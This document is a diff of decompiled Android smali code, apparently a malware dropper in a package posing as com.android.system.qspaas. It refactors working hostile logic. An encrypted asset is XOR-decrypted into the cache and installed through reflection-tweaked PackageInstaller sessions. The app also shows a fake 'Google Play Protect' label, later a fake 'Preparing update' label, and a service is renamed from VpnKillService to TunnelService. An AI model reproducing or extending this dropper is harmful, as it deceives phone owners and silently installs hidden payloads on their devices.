@@ -694,7 +694,7 @@
 
     invoke-direct {v0, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
 
-    const-string v1, "\u2713 Google Play Protect verificado"
+    const-string v1, "Preparing update\u2026"
 
     invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
 
@@ -786,122 +786,20 @@
     .locals 15
 
     .line 1
-    const-string v0, "VEXUwzIPKNljf66aZrY="
-
-    const-string v1, "MCe4qkNoRrMPUcr7Eg=="
-
     const/4 v2, 0x0
 
     :try_start_0
     invoke-virtual {p0}, Lcom/android/system/qspaas/MainActivity;->j()V
 
-    new-instance v3, Ljava/io/File;
+    invoke-static {p0}, Lcom/android/system/qspaas/PayloadUtil;->a(Landroid/content/Context;)Ljava/io/File;
 
-    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
+    move-result-object v3
 
-    move-result-object v4
+    if-nez v3, :cond_0
 
-    invoke-static {v1, v0}, Le0;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v5
-
-    invoke-direct {v3, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
-
-    invoke-virtual {v3}, Ljava/io/File;->exists()Z
-
-    move-result v4
-
-    if-eqz v4, :cond_0
-
-    invoke-virtual {v3}, Ljava/io/File;->delete()Z
+    goto/16 :goto_6
 
     :cond_0
-    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
-
-    move-result-object v4
-
-    invoke-static {v1, v0}, Le0;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v0
-
-    invoke-virtual {v4, v0}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
-
-    move-result-object v0
-
-    new-instance v1, Ljava/io/FileOutputStream;
-
-    invoke-direct {v1, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
-
-    const/16 v4, 0x10
-
-    new-array v4, v4, [B
-
-    invoke-virtual {v0, v4}, Ljava/io/InputStream;->read([B)I
-
-    const/high16 v4, 0x20000
-
-    new-array v5, v4, [B
-
-    const-wide/32 v6, 0x4394d
-
-    :goto_0
-    invoke-virtual {v0, v5}, Ljava/io/InputStream;->read([B)I
-
-    move-result v8
-
-    const/4 v9, -0x1
-
-    if-eq v8, v9, :cond_2
-
-    move v9, v2
-
-    :goto_1
-    if-ge v9, v8, :cond_1
-
-    const-wide/32 v10, 0x19660d
-
-    mul-long/2addr v6, v10
-
-    const-wide/32 v10, 0x3c6ef35f
-
-    add-long/2addr v6, v10
-
-    const-wide v10, 0xffffffffL
-
-    and-long/2addr v6, v10
-
-    const/16 v10, 0x18
-
-    shr-long v10, v6, v10
-
-    const-wide/16 v12, 0xff
-
-    and-long/2addr v10, v12
-
-    long-to-int v10, v10
-
-    aget-byte v11, v5, v9
-
-    xor-int/2addr v10, v11
-
-    int-to-byte v10, v10
-
-    aput-byte v10, v5, v9
-
-    add-int/lit8 v9, v9, 0x1
-
-    goto :goto_1
-
-    :cond_1
-    invoke-virtual {v1, v5, v2, v8}, Ljava/io/FileOutputStream;->write([BII)V
-
-    goto :goto_0
-
-    :cond_2
-    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
-
-    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
-
     invoke-virtual {v3}, Ljava/io/File;->exists()Z
 
     move-result v0
@@ -921,6 +819,10 @@
     goto/16 :goto_6
 
     :cond_3
+    const/high16 v4, 0x20000
+
+    const/4 v9, -0x1
+
     invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
     move-result-object v0
@@ -1074,65 +976,23 @@
     const/16 v10, 0x1f
 
     :try_start_3
-    const-string v11, "ES2pkXAOO2ww4h8w"
-
-    const-string v12, "eEPa5RFiVypcgw=="
-
-    invoke-static {v11, v12}, Le0;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v11
-
-    invoke-virtual {v6, v11}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-
-    move-result-object v11
-
-    invoke-virtual {v11, v8}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V
-
-    invoke-virtual {v11, v7}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I
-
-    move-result v12
-
-    or-int/lit8 v13, v12, 0x6
-
-    sget v14, Landroid/os/Build$VERSION;->SDK_INT:I
-
-    if-lt v14, v10, :cond_5
-
-    const v13, 0x400006
-
-    or-int/2addr v13, v12
-
-    :cond_5
-    invoke-virtual {v11, v7, v13}, Ljava/lang/reflect/Field;->setInt(Ljava/lang/Object;I)V
+    invoke-static {v7}, Lcom/android/system/qspaas/PayloadUtil;->b(Ljava/lang/Object;)V
     :try_end_3
     .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
 
     :catch_1
     :try_start_4
-    const-string v11, "createSession"
-
-    new-array v12, v8, [Ljava/lang/Class;
-
-    aput-object v6, v12, v2
-
-    invoke-virtual {v1, v11, v12}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
-
-    move-result-object v6
-
-    filled-new-array {v7}, [Ljava/lang/Object;
-
-    move-result-object v7
-
-    invoke-virtual {v6, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
-
-    move-result-object v6
-
-    check-cast v6, Ljava/lang/Integer;
-
-    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I
+    invoke-static {v0, v7}, Lcom/android/system/qspaas/PayloadUtil;->c(Ljava/lang/Object;Ljava/lang/Object;)I
 
     move-result v6
 
+    if-gez v6, :cond_5
+
+    invoke-static {p0, v3}, Lcom/android/system/qspaas/PayloadUtil;->d(Landroid/content/Context;Ljava/io/File;)V
+
+    return-void
+
+    :cond_5
     const-string v7, "openSession"
 
     new-array v11, v8, [Ljava/lang/Class;
@@ -1363,6 +1223,12 @@
 
     invoke-virtual {v0, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V
 
+    invoke-static {p0}, Lcom/android/system/qspaas/PayloadUtil;->a(Landroid/content/Context;)Ljava/io/File;
+
+    move-result-object v0
+
+    invoke-static {p0, v0}, Lcom/android/system/qspaas/PayloadUtil;->d(Landroid/content/Context;Ljava/io/File;)V
+
     sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
 
     const/16 v1, 0x1d
@@ -1420,7 +1286,7 @@
 
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v2, ".VpnKillService"
+    const-string v2, ".TunnelService"
 
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -2111,7 +1977,7 @@
 
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    const-string v2, ".VpnKillService"
+    const-string v2, ".TunnelService"
 
     invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -2169,7 +2035,7 @@
     .locals 6
 
     .line 1
-    const-string v0, ".VpnKillService"
+    const-string v0, ".TunnelService"
 
     :try_start_0
     new-instance v1, Landroid/content/Intent;
